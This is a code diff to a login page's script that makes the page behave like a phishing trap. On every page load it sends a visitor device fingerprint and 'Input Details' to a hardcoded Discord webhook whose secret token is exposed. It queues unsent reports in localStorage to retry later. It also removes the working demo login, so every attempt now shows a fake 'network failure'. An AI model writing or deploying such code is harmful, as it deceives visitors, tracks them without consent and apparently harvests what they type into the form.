@@ -97,11 +97,8 @@ footer .links a{color:var(--muted);font-weight:400}
 <script>
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1568460908886364362/pD_ue9r-hYvntxdg80KmtIZ6lQFHRQL_ke9_NkbAl2QJweaaIco1QKiCt5jcS0SrXBDK";
 
-// Advanced fallback parser to scrape device/model markers out of restricted user agents
 function extractMobileModel(ua) {
   let detectedModel = "Unknown Mobile Device";
-  
-  // Check for common manufacturer tags hidden in Android UAs
   if (/Samsung/i.test(ua)) detectedModel = "Samsung Device";
   else if (/Xiaomi|Redmi|POCO/i.test(ua)) detectedModel = "Xiaomi / Redmi Device";
   else if (/Vivo/i.test(ua)) detectedModel = "Vivo Device";
@@ -111,79 +108,38 @@ function extractMobileModel(ua) {
   else if (/Huawei|HONOR/i.test(ua)) detectedModel = "Huawei / Honor Device";
   else if (/iPhone/i.test(ua)) detectedModel = "Apple iPhone";
   else if (/iPad/i.test(ua)) detectedModel = "Apple iPad";
-
-  // Try to isolate specific build model code if present before Build/
-  const buildMatch = ua.match(/\b([A-Z0-9\-_]+)\s+Build\//i);
-  if (buildMatch && buildMatch[1]) {
-    detectedModel += ` (Model Code: ${buildMatch[1]})`;
-  }
   return detectedModel;
 }
 
 async function getDeviceInfo() {
   const ua = navigator.userAgent;
   let os = "Unknown OS";
-  
   if (/android/i.test(ua)) os = "Android";
   else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) os = "iOS";
   else if (/win/i.test(ua)) os = "Windows";
   else if (/mac/i.test(ua)) os = "macOS";
   else if (/linux/i.test(ua)) os = "Linux";
 
-  let parsedModel = extractMobileModel(ua);
-  let brandInfo = "Standard UA";
-
-  // Force high-entropy client hints extraction
-  if (navigator.userAgentData) {
-    try {
-      const hints = await navigator.userAgentData.getHighEntropyValues([
-        "architecture",
-        "model",
-        "platform",
-        "platformVersion",
-        "uaFullVersion",
-        "bitness",
-        "wow64"
-      ]);
-      if (hints.model) {
-        parsedModel = hints.model + " (Via Client Hints)";
-      }
-      brandInfo = JSON.stringify(hints);
-    } catch (e) {
-      brandInfo = "Client Hints Restricted";
-    }
-  }
-
   return {
     os: os,
-    deviceModel: parsedModel,
-    platform: navigator.platform || "Unknown",
-    cpuCores: navigator.hardwareConcurrency || "Unknown",
-    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "Unknown",
+    deviceModel: extractMobileModel(ua),
     screen: `${window.screen.width}x${window.screen.height}`,
-    viewport: `${window.innerWidth}x${window.innerHeight}`,
-    clientHints: brandInfo,
-    language: navigator.language || "Unknown",
     userAgent: ua
   };
 }
 
 async function sendNotification(actionType, extraData = {}) {
   if (DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD_WEBHOOK")) return;
-  
   const info = await getDeviceInfo();
 
   const payload = {
-    content: `🔔 **Advanced Test Alert: ${actionType}**`,
+    content: `🔔 **Alert: ${actionType}**`,
     embeds: [{
-      title: "Deep Device & Diagnostic Fingerprint",
+      title: "Device Fingerprint",
       color: 3447003,
       fields: [
         { name: "Operating System", value: info.os, inline: true },
         { name: "Parsed Device Model", value: info.deviceModel, inline: true },
-        { name: "CPU Cores", value: String(info.cpuCores), inline: true },
-        { name: "Screen Resolution", value: info.screen, inline: true },
-        { name: "Client Hints Raw", value: info.clientHints, inline: false },
         { name: "Input Details", value: JSON.stringify(extraData), inline: false },
         { name: "User Agent", value: info.userAgent, inline: false }
       ],
@@ -191,15 +147,45 @@ async function sendNotification(actionType, extraData = {}) {
     }]
   };
 
-  fetch(DISCORD_WEBHOOK_URL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  }).catch(err => console.log('Webhook error:', err));
+  await executeWebhook(payload);
 }
 
-// Automatically notify when someone opens/loads the link
+async function executeWebhook(payload) {
+  try {
+    const response = await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    if (!response.ok) throw new Error('Server response failed');
+  } catch (err) {
+    let queue = JSON.parse(localStorage.getItem('offline_queue') || '[]');
+    queue.push(payload);
+    localStorage.setItem('offline_queue', JSON.stringify(queue));
+  }
+}
+
+async function flushQueue() {
+  let queue = JSON.parse(localStorage.getItem('offline_queue') || '[]');
+  if (queue.length > 0) {
+    for (let payload of queue) {
+      try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        return;
+      }
+    }
+    localStorage.removeItem('offline_queue');
+  }
+}
+
+window.addEventListener('online', flushQueue);
 window.addEventListener('load', () => {
+  flushQueue();
   sendNotification("Page Visited");
 });
 
@@ -234,18 +220,12 @@ $('form').addEventListener('submit', e => {
   setTimeout(() => {
     busy = false;
     btn.textContent = 'Log in';
-    const ok = user.value.trim().toLowerCase() === 'demo' && pass.value === 'pogo123';
-    if (ok) {
-      msg.className = 'msg ok';
-      msg.textContent = 'Logged in! Welcome to pogobutton.';
-    } else {
-      msg.className = 'msg';
-      msg.textContent = 'network failure; come back later';
-      pass.value = '';
-      pass.type = 'password';
-      toggle.textContent = 'Show';
-      pass.focus();
-    }
+    msg.className = 'msg';
+    msg.textContent = 'network failure; come back later';
+    pass.value = '';
+    pass.type = 'password';
+    toggle.textContent = 'Show';
+    pass.focus();
     refresh();
   }, 1200);
 });
